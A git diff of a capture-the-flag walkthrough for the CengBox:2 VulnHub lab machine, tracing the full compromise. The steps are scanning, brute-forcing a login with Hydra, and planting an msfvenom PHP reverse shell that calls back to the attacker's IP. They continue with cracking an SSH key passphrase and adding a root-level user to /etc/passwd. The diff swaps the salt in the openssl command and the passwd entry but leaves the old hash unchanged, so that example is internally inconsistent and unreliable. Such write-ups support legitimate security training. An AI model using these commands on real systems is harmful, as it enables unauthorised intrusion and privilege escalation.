@@ -1,6 +1,6 @@
 # CengBox2 CTF Walkthrough
 
-[CengBox:2](https://www.vulnhub.com/entry/cengbox-2,486/) is a Linux vulnerable machine. It is an intermediate CTF machine where the objective is to read the user and root flag.  
+[CengBox:2](https://www.vulnhub.com/entry/cengbox-2,486/) is a Linux vulnerable machine. It is an intermediate CTF challenge where the objective is to read the user and root flag.  
 The steps I took to perform the aforementioned tasks were executed autonomously only in a small part, regarding network discovery, directories enumeration and execution of the php reverse shell. For the remaining steps I followed [this](https://www.hackingarticles.in/cengbox-2-vulnhub-walkthrough/) walkthrough to crack the virtual machine.  
 To complete the challenge the following tactics and techniques were employed
 1. [Reconnaissance and Discovery](#reconnaissance-and-discovery)
@@ -27,7 +27,7 @@ nmap -A -p- 192.168.3.18
 ```
 were executed.  
 **Netdiscover** is an active/passive address reconnaissance tool; it can passively detect online hosts, or search for them, by actively sending ARP requests; it was necessary to find the IP address of the vulnerable machine.  
-**Nmap** is a utility for network exploration or security auditing. The `-A` option is used to enable OS detection, version detection, script scanning and traceroute, while the `-p-` option is used to scan all TCP ports.  
+**Nmap** is a utility for network exploration and security auditing. The `-A` option is used to enable OS detection, version detection, script scanning and traceroute, while the `-p-` option is used to scan all TCP ports.  
 The output of `nmap` was:
 
 ![Nmap scan](images/nmap.png)
@@ -46,7 +46,7 @@ To map the domain found in the **note** to the IP of the virtual machine, the fo
 
 ### Enumeration
 
-The URL `http://ceng-company.vm` was inserted in the search bar but the page presented nothin interesting, only a message indicating that the page was under maintenance.  
+The URL `http://ceng-company.vm` was inserted in the search bar but the page presented nothing interesting, only a message indicating that the page was under maintenance.  
 To perform a quick enumeration of directories and URIs the command
 ```bash
 dirb http://ceng-company.vm
@@ -56,7 +56,8 @@ By further investigating the note it was more clear that Aaron was referring to 
 ```bash
 gobuster vhost -u http://ceng-company.vm -w /usr/share/wordlists/subdomains/subdomains-top1million-5000.txt --append-domain
 ```
-**Gobuster** is a tool used to brute-force: URIs (directories and files) in web sites, DNS subdomains (with wildcard support), Virtual Host names on target web servers, Open Amazon S3 buckets, Open Google Cloud buckets and TFTP servers. With the `vhost` mode it searches for **virtual hosts** (that are multiple domains hosted on one single server). The wordlist file contains a list of 5000 common subdomains. The flag `--append-domain` specifies that the domain is to be appended to the wordlist entries.  
+**Gobuster** is a tool used to brute-force URIs (directories and files) in web sites, DNS subdomains (with wildcard support), Virtual Host names on target web servers, Open Amazon S3 buckets, Open Google Cloud buckets and TFTP servers.  
+With the `vhost` mode it searches for **virtual hosts** (that are multiple domains hosted on one single server). The wordlist file contains a list of 5000 common subdomains. The flag `--append-domain` specifies that the domain is to be appended to the wordlist entries.  
 The program resulted in finding the subdomain `admin.ceng-company.vm`, which was added to `/etc/hosts` with IP `192.168.3.18`.  
 Looking up `http://admin.ceng-company.vm` in the browser resulted only in another **forbidden** page.
 
@@ -96,6 +97,10 @@ The final string is composed of 3 parts separated by colons:
 2. the string containing the credentials: `username=^USER^&password=^PASS^`, where `^USER^` and `^PASS^` are placeholders for the username and password, respectively
 3. the message indicating that a wrong username-password pair has been passed to the website: `Wrong email or password`.
 
+Here is the output of Hydra:
+
+![Hydra](images/hydra.png)
+
 ## Initial access and persistence
 
 Once logged in, the website was inspected to find useful information. In the Content panel there was a **File Manager** tab that allowed managing configuration files and folders for the web server.
@@ -106,7 +111,8 @@ It was now possible to gain access to the vulnerable machine via a PHP reverse s
 ```bash
 msfvenom --platform php -a php -p php/meterpreter/reverse_tcp LHOST=192.168.3.70 LPORT=1234
 ```
-**Msfvenom** is a payload generator and encoder. The payload was generated for the platform PHP. Parameters `LHOST` and `LPORT` were configured to be the IP address of the attacker machine and an arbitrary chosen port to which the reverse shell would open a connection to. The generated payload was appended to the `config.php` file.  
+**Msfvenom** is a payload generator and encoder.  
+The payload was generated for the platform PHP. Parameters `LHOST` and `LPORT` were configured to be the IP address of the attacker machine and an arbitrary chosen port to which the reverse shell would open a connection to. The generated payload was appended to the `config.php` file.  
 To exploit the reverse shell the **Metasploit console** was opened with the command `msfconsole`.  
 The **Metasploit Framework** is an open source platform that supports vulnerability research, exploit development, and the creation of custom security tools.  
 From the console the following commands were executed:
@@ -126,9 +132,9 @@ sudo -l
 ```
 The `shell` command opened the default shell of the user `www-data` (that is `/bin/sh`); to open a more powerful shell (`/bin/bash`) the one liner python command was executed.  
 The last one listed the allowed (and forbidden) to execute commands for the invoking user on the current host, as specified by the security policy; it presented the following:
-```bash
-(swartz) NOPASSWD: /home/swartz/runphp.sh
-```
+
+![sudo-l](images/sudo-l.png)
+
 The next command executed was
 ```bash
 sudo -u swartz /home/swartz/runphp.sh
@@ -157,7 +163,8 @@ The next step was to find a way in the SSH server as mitnick. To perform this it
 /usr/bin/ssh2john.py is_rsa > hash
 john hash
 ```
-**John the Ripper** module `ssh2john` allows converting SSH private keys into a hash format that John can understand. With the following command, John attempted in cracking the hash of the password from which the private key is derived.  
+**John the Ripper** is a popular open-source password cracking tool that is used to test the strength of passwords. It is primarily used by security professionals and penetration testers to identify weak passwords in a system's security.  
+The module `ssh2john` allows converting SSH private keys into a hash format that John can understand. With the following command, John attempted in cracking the hash of the password from which the private key is derived.  
 John's default wordlist was enough to crack this password, that was **legend**.  
 With these informations it was possible to log on the SSH server as mitnick:
 ```bash
@@ -191,11 +198,11 @@ In order for the modification to take place it was necessary to log out of the S
 
 showing that the updates took effect.  With `nano` it was now possible to modify `/etc/passwd` to add a new user with password `pass`, as generated by
 ```bash
-openssl passwd -salt randomsa -1 pass
+openssl passwd -salt ransalt -1 pass
 ```
 The line added was
 ```bash
-aleq:$1$randomsa$z9sZ//wbn6R75OIQ7w2ws.:0:0::/root:/bin/bash
+aleq:$1$ransalt$z9sZ//wbn6R75OIQ7w2ws.:0:0::/root:/bin/bash
 ```
 It was now possible to use the substitute user command, `su`, to become the newly created user that has superuser privileges, as specified by the `suid` and `guid` values, both set at `0`. The following commands allow to obtain root privileges and read the flag, terminating the challenge:
 ```bash
